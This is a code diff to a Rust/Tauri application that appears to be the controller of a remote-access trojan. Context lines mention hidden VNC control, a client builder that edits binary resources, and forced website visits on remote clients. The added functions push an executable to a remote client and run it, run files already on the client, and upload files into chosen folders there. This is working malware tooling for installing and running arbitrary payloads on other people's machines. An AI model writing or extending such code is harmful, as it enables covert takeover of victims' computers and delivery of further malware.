@@ -19,7 +19,7 @@ use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
-use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, ClientInfo};
+use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, ClientInfo, FileData};
 use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
 
 use std::process::Command;
@@ -606,5 +606,70 @@ pub async fn manage_hvnc(addr: &str, run: &str, tauri_state: State<'_, SharedTau
         _ => {}
     }
     Ok("HVNC command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn upload_and_execute(
+    addr: &str,
+    file_path: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
+) -> Result<String, String> {
+    // Read the file from disk
+    let file_data = fs::read(file_path)
+        .map_err(|e| format!("Failed to read file: {}", e))?;
+    
+    // Get the filename from the path
+    let file_name = std::path::Path::new(file_path)
+        .file_name()
+        .and_then(|name| name.to_str())
+        .unwrap_or("unknown.exe");
+    
+    // Create FileData struct
+    let file_data = FileData {
+        name: file_name.to_string(),
+        data: file_data,
+    };
+    
+    send_server_command(ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data), tauri_state, app_handle).await?;
+
+    Ok("Upload and execute command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn execute_file(
+    addr: &str,
+    file_path: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
+) -> Result<String, String> {
+    send_server_command(ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()), tauri_state, app_handle).await?;
+
+    Ok("Execute file command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn read_file_for_upload(file_path: &str) -> Result<Vec<u8>, String> {
+    fs::read(file_path)
+        .map_err(|e| format!("Failed to read file: {}", e))
+}
+
+#[tauri::command]
+pub async fn upload_file_to_folder(
+    addr: &str,
+    target_folder: &str,
+    file_name: &str,
+    file_data: Vec<u8>,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
+) -> Result<String, String> {
+    let file_data = FileData {
+        name: file_name.to_string(),
+        data: file_data,
+    };
+    
+    send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;
+
+    Ok("File upload command sent".to_string())
 }
 
